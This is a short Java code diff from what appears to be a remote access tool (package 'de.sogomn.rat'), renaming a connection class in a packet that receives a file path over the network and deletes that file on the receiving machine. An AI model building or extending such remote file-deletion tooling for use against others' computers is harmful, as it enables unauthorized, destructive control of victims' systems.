@@ -2,7 +2,7 @@ package de.sogomn.rat.packet;
 
 import java.io.File;
 
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public final class DeleteFilePacket implements IPacket {
 	
@@ -17,17 +17,17 @@ public final class DeleteFilePacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveClient client) {
+	public void send(final ActiveConnection client) {
 		client.writeUTF(path);
 	}
 	
 	@Override
-	public void receive(final ActiveClient client) {
+	public void receive(final ActiveConnection client) {
 		path = client.readUTF();
 	}
 	
 	@Override
-	public void execute(final ActiveClient client) {
+	public void execute(final ActiveConnection client) {
 		final File file = new File(path);
 		
 		file.delete();
